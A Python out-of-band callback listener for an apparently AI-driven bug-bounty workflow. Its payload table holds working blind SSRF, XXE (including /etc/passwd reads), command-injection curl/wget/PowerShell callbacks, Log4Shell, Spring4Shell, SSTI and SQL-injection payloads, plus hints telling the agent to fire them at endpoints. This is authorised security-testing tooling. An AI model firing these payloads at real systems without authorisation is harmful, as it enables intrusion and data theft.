#!/usr/bin/env python3
"""oast_listen.py — Out-of-band (OAST) callback listener for Blind vulnerabilities.

Blind SSRF / blind RCE / blind XXE / blind SQLi require an external observer.
This tool wraps `interactsh-client` (ProjectDiscovery) when available, and
falls back to webhook.site as an optional external service when explicitly
opted into.

Design choices:

- **Soft dependency on interactsh-client.** If the binary is missing and
  --allow-external is not set, `start` prints an install hint and exits 0.
  This keeps Claude's autopilot loop flowing instead of hard-failing.

- **PID-based single instance per target.** Writes findings/<target>/oast/pid
  on start; status/stop/poll consult the same file.

- **JSONL callback log.** interactsh dumps one JSON object per callback to
  findings/<target>/oast/callbacks.jsonl; webhook.site is reshaped to the same
  schema so downstream consumers stay backend-agnostic.

- **CLAUDE_HINT block on every command.** Same YAML-style block that
  recon_engine.sh emits — Claude can grep one place to understand the OAST
  state without statting individual files.

Subcommands:
  start    Launch listener; print callback URL.
  poll     Drain new callbacks since the last poll (or all if --since 0).
  stop     Terminate listener (SIGTERM then SIGKILL after 3s).
  status   List all known OAST instances and their liveness.
  payloads Print blind-class payloads with the active OAST URL substituted.

Usage examples:
  python3 tools/oast_listen.py start    --target shop.com
  python3 tools/oast_listen.py --start --provider interactsh  # legacy alias; uses target=default
  python3 tools/oast_listen.py payloads --target shop.com --vuln-class XXE
  python3 tools/oast_listen.py poll     --target shop.com
  python3 tools/oast_listen.py stop     --target shop.com
  python3 tools/oast_listen.py status
"""

from __future__ import annotations

import argparse
import errno
import json
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

# ─── Logging to stderr ──────────────────────────────────────────────────────
_GREEN = "\033[0;32m"
_RED = "\033[0;31m"
_YELLOW = "\033[1;33m"
_CYAN = "\033[0;36m"
_NC = "\033[0m"


def _log_info(msg: str) -> None:
    print(f"{_CYAN}[*]{_NC} {msg}", file=sys.stderr)


def _log_ok(msg: str) -> None:
    print(f"{_GREEN}[+]{_NC} {msg}", file=sys.stderr)


def _log_warn(msg: str) -> None:
    print(f"{_YELLOW}[!]{_NC} {msg}", file=sys.stderr)


def _log_err(msg: str) -> None:
    print(f"{_RED}[-]{_NC} {msg}", file=sys.stderr)


# ─── Paths ──────────────────────────────────────────────────────────────────
REPO_ROOT = Path(__file__).resolve().parent.parent
FINDINGS_ROOT = REPO_ROOT / "findings"

INTERACTSH_BIN = "interactsh-client"
WEBHOOK_SITE_API = "https://webhook.site/token"
PID_GRACE_SECS = 3

# ─── OAST payload templates ─────────────────────────────────────────────────
# Curated, ready-to-fire payloads for blind-class confirmation.
#
# Substitution token: literal `OAST_URL` — replaced verbatim with the contents
# of findings/<target>/oast/url.txt at payload generation time. Templates are
# designed assuming OAST_URL resolves to a bare hostname (e.g. abc.oast.fun)
# which is what `interactsh-client` emits; webhook.site URLs (with scheme)
# also work but produce slightly redundant `https://https://...` strings —
# operator can hand-edit if the target rejects them.
#
# Curation rule: 5-15 payloads per class, biased toward shapes that hit on
# real bug-bounty disclosures (HackerOne/Intigriti). One-row edits add new
# payloads or classes.
OAST_PAYLOAD_TEMPLATES: dict[str, list[str]] = {
    "SSRF": [
        # --- Bare URL replacements (fits ?url=, ?image_url=, JSON {"url":...}) ---
        "http://OAST_URL/ssrf-http",
        "https://OAST_URL/ssrf-https",
        "//OAST_URL/ssrf-protocol-relative",
        # --- Userinfo / fragment confusion (Ruby/Node URL parser splits) ---
        "http://OAST_URL@127.0.0.1/ssrf-userinfo",
        "http://127.0.0.1@OAST_URL/ssrf-attacker-as-pass",
        "http://OAST_URL#@127.0.0.1/ssrf-fragment",
        # --- Non-HTTP schemes (gopher = SSRF→Redis/SMTP, dict = memcached) ---
        "gopher://OAST_URL:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20OAST_URL%0d%0a%0d%0a",
        "dict://OAST_URL:11211/stat",
        # --- JSON / XML body shapes ---
        '{"url":"http://OAST_URL/ssrf-json-url"}',
        '{"image_url":"http://OAST_URL/ssrf-image-url","callback_url":"http://OAST_URL/cb"}',
        # --- SVG href / image fetcher (PDF generators, image processors) ---
        '<svg xmlns="http://www.w3.org/2000/svg"><image href="http://OAST_URL/ssrf-svg"/></svg>',
        # --- OAuth/SAML redirect_uri lane ---
        "http://OAST_URL/oauth-cb",
    ],
    "XXE": [
        # --- Classic general entity (works on permissive parsers) ---
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OAST_URL/xxe-general">]>\n'
        '<foo>&xxe;</foo>',
        # --- Parameter entity (bypasses some general-entity blocklists) ---
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OAST_URL/xxe-param">%xxe;]>\n'
        '<foo>1</foo>',
        # --- OOB file exfil via external DTD (requires hosting exfil.dtd) ---
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://OAST_URL/exfil.dtd">%dtd;]>\n'
        '<foo>1</foo>',
        # --- XInclude (works when DOCTYPE is stripped but XInclude is on) ---
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include href="http://OAST_URL/xinclude" parse="text"/></foo>',
        # --- SVG XXE (file upload / image processor lane) ---
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://OAST_URL/svg-xxe">]>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
        '<text>&xxe;</text></svg>',
        # --- SOAP envelope XXE ---
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OAST_URL/soap-xxe">]>\n'
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soap:Body>&xxe;</soap:Body></soap:Envelope>',
        # --- PHP-filter base64 file read chained with OOB DTD ---
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">\n'
        '  <!ENTITY % dtd SYSTEM "http://OAST_URL/php-filter.dtd">\n'
        '  %dtd;\n'
        ']>\n<foo>1</foo>',
    ],
    "RCE": [
        # --- Shell metacharacters (host header / param injection lane) ---
        "; curl http://OAST_URL/rce-semi",
        "| curl http://OAST_URL/rce-pipe",
        "& curl http://OAST_URL/rce-amp",
        "&& curl http://OAST_URL/rce-and",
        "$(curl http://OAST_URL/rce-dollar)",
        "`curl http://OAST_URL/rce-backtick`",
        # --- Exfil-via-tool variants (curl blocked? try wget) ---
        ";wget -q http://OAST_URL/rce-wget -O /dev/null",
        # --- Windows / PowerShell ---
        '; powershell -c "(New-Object Net.WebClient).DownloadString(\'http://OAST_URL/rce-pwsh\')"',
        # --- Log4Shell + obfuscation bypass (Java JNDI lookup lane) ---
        "${jndi:ldap://OAST_URL/log4shell}",
        "${${lower:j}ndi:${lower:l}dap://OAST_URL/log4shell-obf}",
        # --- Spring4Shell SpEL ---
        '${T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://OAST_URL/spring4shell"})}',
        # --- SSTI: Jinja2 / Twig / Freemarker ---
        "{{ ''.__class__.__mro__[1].__subclasses__()[40]"
        "('/etc/passwd').read() }}|curl http://OAST_URL/jinja",
        "{{ _self.env.registerUndefinedFilterCallback('exec') }}"
        "{{ _self.env.getFilter('curl http://OAST_URL/twig') }}",
        '<#assign ex="freemarker.template.utility.Execute"?new()>'
        '${ex("curl http://OAST_URL/freemarker")}',
    ],
    "SQLi": [
        # --- MSSQL: xp_dirtree triggers SMB → DNS lookup ---
        "'; EXEC master..xp_dirtree '\\\\OAST_URL\\share'-- -",
        # --- MSSQL: alternative xp_fileexist ---
        "'; EXEC master..xp_fileexist '\\\\OAST_URL\\test'-- -",
        # --- PostgreSQL: COPY ... TO PROGRAM (OOB via shell) ---
        "'; COPY (SELECT '') TO PROGRAM 'curl http://OAST_URL/pg-copy'-- -",
        # --- PostgreSQL: dblink_connect callback ---
        "'; SELECT dblink_connect('host=OAST_URL "
        "user=u password=p dbname=postgres')-- -",
        # --- MySQL: LOAD_FILE UNC path (Windows MySQL with FILE priv) ---
        "' UNION SELECT LOAD_FILE("
        "CONCAT('\\\\\\\\',version(),'.OAST_URL\\\\test'))-- -",
        # --- Oracle: UTL_HTTP.REQUEST OOB ---
        "' UNION SELECT UTL_HTTP.REQUEST("
        "'http://OAST_URL/oracle-utlhttp') FROM DUAL-- -",
        # --- Oracle: DBMS_LDAP.INIT (alternative when UTL_HTTP is locked) ---
        "' UNION SELECT DBMS_LDAP.INIT("
        "'OAST_URL', 80) FROM DUAL-- -",
        # --- Oracle: HTTPURITYPE / XMLType ---
        "' UNION SELECT HTTPURITYPE("
        "'http://OAST_URL/oracle-httpuri').GETCLOB() FROM DUAL-- -",
    ],
}


def _target_dir(target: str) -> Path:
    safe = target.replace("/", "_").strip()
    return FINDINGS_ROOT / safe / "oast"


def _paths(target: str) -> dict[str, Path]:
    base = _target_dir(target)
    return {
        "base": base,
        "pid": base / "pid",
        "url": base / "url.txt",
        "backend": base / "backend.txt",
        "callbacks": base / "callbacks.jsonl",
        "since": base / "since.txt",
    }


def _pid_alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except OSError as exc:
        return exc.errno == errno.EPERM
    return True


def _pid_matches_oast(pid: int, paths: dict[str, Path]) -> bool:
    """确认 pid 确实是本目标 OAST listener，避免 pid 复用导致误杀。

    Linux 下优先读取 `/proc/<pid>/cmdline`，要求命令行同时包含
    `interactsh-client` 和当前 target 的 callbacks.jsonl 路径。若平台没有
    `/proc`，保持旧行为：只要 pid 存活就视为可管理，避免破坏非 Linux 环境。
    """
    proc_cmdline = Path(f"/proc/{pid}/cmdline")
    if not proc_cmdline.exists():
        return _pid_alive(pid)
    try:
        text = proc_cmdline.read_bytes().replace(b"\x00", b" ").decode(
            "utf-8", errors="replace"
        )
    except OSError:
        return False
    return INTERACTSH_BIN in text and str(paths["callbacks"]) in text


def _read_pid(p: Path) -> Optional[int]:
    if not p.is_file():
        return None
    try:
        return int(p.read_text().strip())
    except (ValueError, OSError):
        return None


# ─── Soft-dep helpers ───────────────────────────────────────────────────────
def interactsh_installed() -> bool:
    return shutil.which(INTERACTSH_BIN) is not None


# ─── Backends ───────────────────────────────────────────────────────────────
def _start_interactsh(target: str, paths: dict[str, Path]) -> tuple[int, str]:
    """Spawn interactsh-client and persist pid/url/backend. Return (pid, url)."""
    paths["base"].mkdir(parents=True, exist_ok=True)
    callbacks = paths["callbacks"]
    # interactsh-client appends JSON-per-line when -json is set.
    cmd = [INTERACTSH_BIN, "-json", "-o", str(callbacks)]
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=str(paths["base"]),
        start_new_session=True,
    )
    paths["pid"].write_text(str(proc.pid))
    paths["backend"].write_text("interactsh")
    # Wait briefly for interactsh to print the URL banner on stdout.
    url = _extract_interactsh_url(proc)
    if url:
        paths["url"].write_text(url)
    return proc.pid, url or "(URL pending — check callbacks.jsonl)"


def _extract_interactsh_url(proc: subprocess.Popen, max_lines: int = 30) -> str:
    """Read interactsh-client banner until we spot the registered URL."""
    if proc.stdout is None:
        return ""
    for _ in range(max_lines):
        line = proc.stdout.readline()
        if not line:
            break
        try:
            text = line.decode("utf-8", errors="replace").strip()
        except AttributeError:
            text = str(line).strip()
        # interactsh prints something like:  [INF] Listing 1 payload(s) ... abc.oast.fun
        if ".oast." in text or ".interactsh" in text:
            for token in text.split():
                if ".oast." in token or ".interactsh" in token:
                    return token.strip()
    return ""


def _start_webhook_site(target: str, paths: dict[str, Path]) -> tuple[int, str]:
    """Create a webhook.site URL via their public API.

    External path — only reached when --allow-external is passed.
    Records "no local process" by setting pid to 0 (status() treats 0 as dead).
    """
    paths["base"].mkdir(parents=True, exist_ok=True)
    request = Request(WEBHOOK_SITE_API, method="POST", data=b"")
    with urlopen(request, timeout=10) as resp:
        payload = json.loads(resp.read().decode("utf-8"))
    token = payload.get("uuid")
    if not token:
        raise RuntimeError("webhook.site returned no uuid")
    url = f"https://webhook.site/{token}"
    paths["url"].write_text(url)
    paths["backend"].write_text("webhook.site")
    # No local process; mark pid=0 (we still need a path for status()).
    paths["pid"].write_text("0")
    return 0, url


# ─── Subcommands ────────────────────────────────────────────────────────────
def cmd_start(target: str, allow_external: bool) -> int:
    paths = _paths(target)
    # Single-instance guard.
    pid = _read_pid(paths["pid"])
    if pid is not None and pid > 0 and _pid_alive(pid) and _pid_matches_oast(pid, paths):
        existing_url = paths["url"].read_text().strip() if paths["url"].is_file() else "(unknown)"
        _log_warn(f"OAST already running for {target} (pid={pid}); URL={existing_url}")
        _emit_start_hint(target, "already_running", existing_url, "interactsh")
        return 0

    if interactsh_installed():
        try:
            pid, url = _start_interactsh(target, paths)
            backend = "interactsh"
        except (OSError, subprocess.SubprocessError) as exc:
            _log_err(f"failed to start interactsh-client: {exc}")
            return 1
    elif allow_external:
        _log_warn(
            "interactsh-client not installed — using webhook.site fallback (data leaves your machine)."
        )
        try:
            pid, url = _start_webhook_site(target, paths)
            backend = "webhook.site"
        except (URLError, HTTPError, json.JSONDecodeError, RuntimeError, OSError) as exc:
            _log_err(f"webhook.site fallback failed: {exc}")
            return 1
    else:
        _log_info(
            "interactsh-client not installed. Soft-failing.\n"
            "  Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n"
            "  Or pass --allow-external to use webhook.site (data leaves your machine)."
        )
        _emit_start_hint(target, "soft_dep_missing", "", "none")
        return 0

    _log_ok(f"OAST started; backend={backend} pid={pid} url={url}")
    _emit_start_hint(target, "started", url, backend, pid=pid)
    return 0


def _emit_start_hint(target: str, state: str, url: str, backend: str, *, pid: int = 0) -> None:
    sys.stdout.write(
        "\n## CLAUDE_HINT\n"
        "phase: oast\n"
        f"target: {target}\n"
        f"state: {state}\n"
        f"backend: {backend}\n"
        f"oast_url: {url}\n"
        f"pid: {pid}\n"
        "next_priority_action: include the URL in SSRF/XXE/RCE payloads, then run "
        "tools/oast_listen.py poll periodically to drain callbacks\n"
    )


def cmd_poll(target: str, since_ts: int) -> int:
    paths = _paths(target)
    if not paths["callbacks"].is_file():
        backend_path = paths["backend"]
        backend = backend_path.read_text().strip() if backend_path.is_file() else "unknown"
        if backend == "webhook.site":
            return _poll_webhook_site(target, paths, since_ts)
        _log_warn(f"no callbacks.jsonl yet for {target}")
        _emit_poll_hint(target, drained=0)
        return 0
    drained = 0
    last_ts = since_ts
    for line in paths["callbacks"].read_text(encoding="utf-8").splitlines():
        if not line.strip():
            continue
        try:
            record = json.loads(line)
        except json.JSONDecodeError:
            continue
        normalized = _normalize_callback(record)
        if normalized["ts_unix"] < since_ts:
            continue
        sys.stdout.write(json.dumps(normalized) + "\n")
        drained += 1
        last_ts = max(last_ts, normalized["ts_unix"])
    paths["since"].write_text(str(last_ts))
    _emit_poll_hint(target, drained=drained)
    return 0


def _poll_webhook_site(target: str, paths: dict[str, Path], since_ts: int) -> int:
    url = paths["url"].read_text().strip() if paths["url"].is_file() else ""
    if not url:
        _log_err(f"no webhook.site URL recorded for {target}")
        return 1
    token = url.rstrip("/").split("/")[-1]
    api_url = f"https://webhook.site/token/{token}/requests"
    try:
        with urlopen(api_url, timeout=10) as resp:
            payload = json.loads(resp.read().decode("utf-8"))
    except (URLError, HTTPError, json.JSONDecodeError, OSError) as exc:
        _log_err(f"webhook.site poll failed: {exc}")
        return 1
    drained = 0
    last_ts = since_ts
    for req in payload.get("data", []) or []:
        ts_iso = req.get("created_at", "")
        ts_unix = _iso_to_unix(ts_iso)
        if ts_unix < since_ts:
            continue
        normalized = {
            "ts": ts_iso,
            "ts_unix": ts_unix,
            "protocol": "http",
            "source_ip": req.get("ip", ""),
            "name": url,
            "path": req.get("url", ""),
            "method": req.get("method", ""),
            "raw": json.dumps(req)[:1024],
        }
        sys.stdout.write(json.dumps(normalized) + "\n")
        drained += 1
        last_ts = max(last_ts, ts_unix)
    paths["since"].write_text(str(last_ts))
    _emit_poll_hint(target, drained=drained)
    return 0


def _emit_poll_hint(target: str, *, drained: int) -> None:
    next_action = (
        "no new callbacks — keep payloads in flight, poll again later"
        if drained == 0
        else "review drained callbacks; correlate source_ip/path with sent payloads"
    )
    sys.stdout.write(
        "\n## CLAUDE_HINT\n"
        "phase: oast_poll\n"
        f"target: {target}\n"
        f"new_callbacks: {drained}\n"
        f"next_priority_action: {next_action}\n"
    )


def cmd_stop(target: str) -> int:
    paths = _paths(target)
    pid = _read_pid(paths["pid"])
    if pid is None:
        _log_warn(f"no OAST instance recorded for {target}")
        return 0
    if pid == 0:
        # webhook.site has no local process — just unlink state files.
        for key in ("pid", "url", "backend"):
            if paths[key].is_file():
                paths[key].unlink()
        _log_ok(f"webhook.site OAST entry cleared for {target} (callbacks.jsonl preserved)")
        return 0
    if not _pid_alive(pid):
        _log_warn(f"recorded pid {pid} not alive; cleaning state")
        for key in ("pid", "url", "backend"):
            if paths[key].is_file():
                paths[key].unlink()
        return 0
    if not _pid_matches_oast(pid, paths):
        _log_warn(f"recorded pid {pid} is alive but does not match this OAST listener; cleaning stale state")
        for key in ("pid", "url", "backend"):
            if paths[key].is_file():
                paths[key].unlink()
        return 0
    try:
        os.kill(pid, signal.SIGTERM)
    except OSError as exc:
        _log_err(f"SIGTERM to {pid} failed: {exc}")
        return 1
    for _ in range(PID_GRACE_SECS * 10):
        if not _pid_alive(pid):
            break
        time.sleep(0.1)
    if _pid_alive(pid):
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
    for key in ("pid", "url", "backend"):
        if paths[key].is_file():
            paths[key].unlink()
    _log_ok(f"OAST stopped for {target} (pid={pid}). callbacks.jsonl preserved.")
    return 0


def cmd_status() -> int:
    if not FINDINGS_ROOT.is_dir():
        sys.stdout.write("(no OAST instances)\n")
        return 0
    rows = []
    for target_dir in sorted(FINDINGS_ROOT.iterdir()):
        oast = target_dir / "oast"
        pid_path = oast / "pid"
        if not pid_path.is_file():
            continue
        pid = _read_pid(pid_path)
        url = (oast / "url.txt").read_text().strip() if (oast / "url.txt").is_file() else ""
        backend = (
            (oast / "backend.txt").read_text().strip() if (oast / "backend.txt").is_file() else "?"
        )
        callbacks = (oast / "callbacks.jsonl").stat().st_size if (oast / "callbacks.jsonl").is_file() else 0
        alive = "live" if pid and pid > 0 and _pid_alive(pid) else "dead"
        rows.append(
            f"{target_dir.name:<32} backend={backend:<12} pid={pid or 0:<6} {alive:<5} url={url} bytes={callbacks}"
        )
    if not rows:
        sys.stdout.write("(no OAST instances)\n")
    else:
        sys.stdout.write("Active / recorded OAST listeners:\n")
        for row in rows:
            sys.stdout.write(f"  {row}\n")
    return 0


def _resolve_vuln_class(name: str) -> Optional[str]:
    """Map user input to a canonical OAST_PAYLOAD_TEMPLATES key.

    Case-insensitive; returns None when the name doesn't match any class.
    Returning None lets the caller emit a clear error with the supported set
    instead of leaking a KeyError.
    """
    if not name:
        return None
    lower_to_canonical = {k.lower(): k for k in OAST_PAYLOAD_TEMPLATES}
    return lower_to_canonical.get(name.strip().lower())


def cmd_payloads(target: str, vuln_class: str) -> int:
    """Substitute the active OAST URL into curated blind-class payloads.

    Reads findings/<target>/oast/url.txt (canonical location written by `start`)
    and prints ready-to-fire payloads to stdout. Also writes them to
    findings/<target>/oast/payloads_<class>.txt for replay/audit.

    Errors clearly when no listener was ever started for the target — operator
    must run `start --target <target>` first.
    """
    paths = _paths(target)
    url_path = paths["url"]
    if not url_path.is_file():
        _log_err(
            f"no OAST URL recorded for {target}. "
            f"Run `python3 tools/oast_listen.py start --target {target}` first."
        )
        return 2
    raw = url_path.read_text(encoding="utf-8").strip()
    if not raw:
        _log_err(
            f"OAST URL file is empty for {target} ({url_path}). "
            "Listener may have failed to register. Re-run `start`."
        )
        return 2
    canonical = _resolve_vuln_class(vuln_class)
    if canonical is None:
        supported = ", ".join(sorted(OAST_PAYLOAD_TEMPLATES.keys()))
        _log_err(
            f"unknown vuln-class '{vuln_class}'. Supported: {supported}"
        )
        return 2
    templates = OAST_PAYLOAD_TEMPLATES[canonical]
    substituted = [t.replace("OAST_URL", raw) for t in templates]
    # Persist for replay
    paths["base"].mkdir(parents=True, exist_ok=True)
    out_file = paths["base"] / f"payloads_{canonical}.txt"
    out_file.write_text("\n".join(substituted) + "\n", encoding="utf-8")
    # Print to stdout — the operator copy/pastes from here straight into Burp
    for payload in substituted:
        sys.stdout.write(payload + "\n")
        sys.stdout.write("---\n")
    _emit_payloads_hint(target, canonical, len(substituted), out_file, raw)
    return 0


def _emit_payloads_hint(
    target: str, vuln_class: str, count: int, out_file: Path, oast_url: str
) -> None:
    sys.stdout.write(
        "\n## CLAUDE_HINT\n"
        "phase: oast_payloads\n"
        f"target: {target}\n"
        f"vuln_class: {vuln_class}\n"
        f"oast_url: {oast_url}\n"
        f"payload_count: {count}\n"
        f"saved_to: {out_file}\n"
        "next_priority_action: fire payloads at suspected blind-class endpoints, "
        "then run `python3 tools/oast_listen.py poll --target "
        f"{target}` to drain callbacks\n"
    )


# ─── Callback normalization ─────────────────────────────────────────────────
def _normalize_callback(record: dict) -> dict:
    """Produce a stable schema across interactsh and webhook.site sources."""
    ts_iso = record.get("timestamp") or record.get("time") or record.get("ts") or ""
    return {
        "ts": ts_iso,
        "ts_unix": _iso_to_unix(ts_iso),
        "protocol": record.get("protocol", ""),
        "source_ip": record.get("remote-address") or record.get("source-ip") or record.get("ip") or "",
        "name": record.get("unique-id") or record.get("full-id") or record.get("name") or "",
        "path": record.get("request") or record.get("path") or "",
        "raw": (record.get("raw-request") or json.dumps(record))[:1024],
    }


def _iso_to_unix(ts_iso: str) -> int:
    if not ts_iso:
        return 0
    # Strip nanoseconds if present.
    cleaned = ts_iso.replace("Z", "+00:00").split(".")[0]
    fmts = ("%Y-%m-%dT%H:%M:%S+00:00", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S")
    for fmt in fmts:
        try:
            return int(time.mktime(time.strptime(cleaned, fmt)))
        except (ValueError, TypeError):
            continue
    return 0


# ─── Entrypoint ─────────────────────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="oast_listen.py",
        description="OAST callback listener for Blind vulnerabilities (interactsh wrapper).",
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    p_start = sub.add_parser("start", help="Launch listener; print callback URL.")
    p_start.add_argument("--target", required=True, help="Target name (used for findings/<target>/oast/).")
    p_start.add_argument(
        "--allow-external",
        action="store_true",
        help="Fall back to webhook.site when interactsh-client is missing.",
    )

    p_poll = sub.add_parser("poll", help="Drain new callbacks since last poll.")
    p_poll.add_argument("--target", required=True)
    p_poll.add_argument(
        "--since-ts",
        type=int,
        default=0,
        help="Unix timestamp filter; 0 returns the full log (default 0).",
    )

    p_stop = sub.add_parser("stop", help="Terminate listener (SIGTERM then SIGKILL).")
    p_stop.add_argument("--target", required=True)

    sub.add_parser("status", help="List all known OAST instances and liveness.")

    p_payloads = sub.add_parser(
        "payloads",
        help="Print blind-class payloads with the active OAST URL substituted.",
    )
    p_payloads.add_argument("--target", required=True)
    p_payloads.add_argument(
        "--vuln-class",
        required=True,
        choices=sorted(OAST_PAYLOAD_TEMPLATES.keys()),
        help="Blind vulnerability class to generate payloads for.",
    )
    return p


def _normalize_legacy_argv(argv: list[str]) -> list[str]:
    """兼容旧提示里常见的 `--start --provider interactsh` 写法。

    当前规范 CLI 使用子命令：`start --target <target>`。但长期会话里模型
    偶尔会生成旧式 flag，argparse 会把 provider 值误当成 subcommand。
    这里只做薄兼容，不改变标准子命令路径：

    - `--start` / `--poll` / `--stop` / `--status` / `--payloads` 映射到子命令；
    - `--provider interactsh` 对本工具没有额外含义，丢弃；
    - `--provider webhook|webhook.site|webhook-site` 映射为 `--allow-external`；
    - legacy `--start` 缺少 target 时使用 `default`，保证“只想拿 OAST URL”
      的临时命令不会因为组织目录名而失败。标准 `start` 仍要求显式 target。
    """
    legacy_to_cmd = {
        "--start": "start",
        "--poll": "poll",
        "--stop": "stop",
        "--status": "status",
        "--payloads": "payloads",
    }
    matched = next((flag for flag in legacy_to_cmd if flag in argv), None)
    if matched is None:
        return argv

    normalized: list[str] = [legacy_to_cmd[matched]]
    provider: str | None = None
    skip_next = False
    for idx, item in enumerate(argv):
        if skip_next:
            skip_next = False
            continue
        if item == matched:
            continue
        if item == "--provider":
            provider = argv[idx + 1] if idx + 1 < len(argv) else ""
            skip_next = True
            continue
        normalized.append(item)

    if normalized[0] == "start" and "--target" not in normalized:
        normalized.extend(["--target", os.environ.get("OAST_TARGET", "default")])

    provider_norm = (provider or "").strip().lower().replace("_", "-")
    if normalized[0] == "start" and provider_norm in {"webhook", "webhook.site", "webhook-site"}:
        if "--allow-external" not in normalized:
            normalized.append("--allow-external")
    return normalized


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    raw_argv = list(sys.argv[1:] if argv is None else argv)
    args = parser.parse_args(_normalize_legacy_argv(raw_argv))

    if args.cmd == "start":
        return cmd_start(args.target, args.allow_external)
    if args.cmd == "poll":
        return cmd_poll(args.target, args.since_ts)
    if args.cmd == "stop":
        return cmd_stop(args.target)
    if args.cmd == "status":
        return cmd_status()
    if args.cmd == "payloads":
        return cmd_payloads(args.target, args.vuln_class)
    parser.error(f"unknown command {args.cmd}")
    return 2


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
